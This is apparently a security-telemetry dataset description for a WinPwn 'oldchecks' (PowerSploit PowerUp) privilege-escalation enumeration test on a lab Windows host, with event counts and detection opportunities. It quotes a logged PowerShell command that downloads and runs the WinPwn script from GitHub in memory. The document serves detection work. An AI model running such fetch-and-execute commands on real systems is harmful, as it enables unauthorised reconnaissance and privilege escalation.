# T1082-16: System Information Discovery — WinPwn - Powersploits Privesc Checks

## Technique Context

T1082 (System Information Discovery) encompasses the host enumeration activity that follows initial access and precedes privilege escalation or lateral movement. The `oldchecks` function in WinPwn runs privilege escalation checks sourced from PowerSploit, a well-established PowerShell-based offensive framework developed by Will Schroeder and others. PowerSploit's privilege escalation module (`PowerUp`) is among the most widely used tools in the Windows offensive security toolkit and in real-world post-exploitation activity.

PowerUp checks for a specific set of Windows privilege escalation vulnerabilities: unquoted service paths, modifiable service binaries, always-install-elevated registry keys, writable registry service paths, unattended installation files with credentials, weak registry permissions, DLL hijacking opportunities, and token privilege checks. These are not exotic vulnerabilities — they are well-documented configuration weaknesses that appear frequently in enterprise environments and have been exploited in real attacks for well over a decade.

The `oldchecks` name in WinPwn reflects the toolkit's characterization of these as "classic" or established checks drawn from existing publicly available tooling rather than novel research.

## What This Dataset Contains

This dataset captures the full execution of WinPwn's `oldchecks` function on ACME-WS06.acme.local with Defender disabled. The execution runs as `NT AUTHORITY\SYSTEM`.

The Security log (EID 4688) and Sysmon (EID 1) record the invocation:

```
"powershell.exe" & {$S3cur3Th1sSh1t_repo = 'https://raw.githubusercontent.com/S3cur3Th1sSh1t'
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
oldchecks -noninteractive -consoleoutput}
```

The Security channel (16 events) consists entirely of EID 4688 process creation events. The non-mscorsvw processes are `whoami.exe` (identity check) and the `powershell.exe` invocation. The remaining 14 events are `mscorsvw.exe` workers from .NET NGen compilation.

The Sysmon channel (59 events) breaks down as: 32 EID 11 (file creates), 19 EID 7 (image loads), 3 EID 1 (process creates), 3 EID 10 (process access), 1 EID 17 (named pipe), and 1 EID 22 (DNS). The EID 7 count (19 image loads) is the highest in the T1082 WinPwn series, indicating that `oldchecks`/PowerUp loaded more DLLs and .NET assemblies into the PowerShell process than the other modules. This is consistent with PowerSploit's PowerUp being a .NET-adjacent module that loads reflection-based components.

The PowerShell channel (109 events: 107 EID 4104, 1 EID 4103, 1 EID 4100) follows the same pattern as the other T1082 WinPwn tests. The EID 4100 error event is present here as well.

Compared to the defended dataset (37 sysmon, 11 security, 47 PowerShell events), this undefended capture shows more Sysmon activity (59 vs. 37) and more PowerShell events (109 vs. 47). The Sysmon increase is primarily in EID 11 file creates and EID 7 image loads.

## What This Dataset Does Not Contain

PowerSploit's `PowerUp` module generates its output as console text rather than writing files to disk. The actual findings — a list of exploitable service paths, registry keys, or misconfigurations on this specific endpoint — are not captured in event telemetry.

The specific PowerSploit functions invoked within `oldchecks` (`Get-ServiceUnquoted`, `Get-ModifiableServiceFile`, `Get-RegistryAlwaysInstallElevated`, etc.) run as PowerShell functions within the same process — they do not spawn child processes that would appear in EID 4688. The process creation events captured here are primarily the .NET background compiler and the ART test framework utilities.

No credential data is targeted or captured by this module; `oldchecks` is purely a reconnaissance/privilege escalation enumeration function, not a credential harvesting function.

## Assessment

The `oldchecks`/PowerSploit privilege escalation check module produces a characteristic Sysmon profile: relatively high DLL/image load count (19 EID 7) compared to process creation (3 EID 1), consistent with a module that loads substantial .NET and reflection infrastructure but runs its actual checks inside the PowerShell process rather than spawning subprocesses.

This dataset represents the telemetry baseline for PowerUp-based privilege escalation enumeration in an undefended environment. The execution is complete and uninterrupted — PowerUp ran its full check suite against the endpoint. The lack of post-execution artifacts (no files written containing results) means the telemetry captured here is the only persistent evidence of this enumeration.

The WinPwn `oldchecks` function is likely to appear in real intrusions by threat actors who use public offensive frameworks — PowerSploit remains widely referenced in threat intelligence reporting. The in-memory loading pattern via `iex(downloadstring(...))` is the delivery mechanism that security teams need to detect, as the PowerSploit module itself leaves no file artifact.

## Detection Opportunities Present in This Data

**Security EID 4688 / Sysmon EID 1 — WinPwn with oldchecks invocation:** The command line `oldchecks -noninteractive -consoleoutput` following the WinPwn in-memory load is a direct indicator. The GitHub URL with the pinned commit hash is a static fingerprint of this specific WinPwn version.

**Sysmon EID 7 — Elevated DLL/image load count (19 events):** PowerUp's dependency on .NET reflection infrastructure produces more image load events than simpler modules. A PowerShell process loading 19 distinct DLLs/assemblies during a short execution window is anomalous compared to typical PowerShell use.

**Sysmon EID 11 — 32 file creation events:** The file system writes during this execution (primarily .NET NGen cache) indicate managed code compilation triggered by loading PowerSploit's .NET-adjacent components. This is a secondary indicator corroborating that a .NET-heavy PowerShell module ran.

**PowerShell EID 4104 — In-memory module execution:** The script block log captures the WinPwn invocation framework. Even without the PowerSploit module content itself being captured (it's loaded from the remote URL into memory), the invocation wrapper and ART test framework blocks are logged, providing attribution.

**Pattern consistency — All T1082 WinPwn tests share the same infrastructure:** The GitHub URL, execution context, and invocation pattern are identical across T1082-14 through T1082-20. Observing this pattern once allows you to recognize it in any of the other tests — the function name (`oldchecks` vs. `winPEAS` vs. `itm4nprivesc`) is the only variable distinguishing them in the command line.
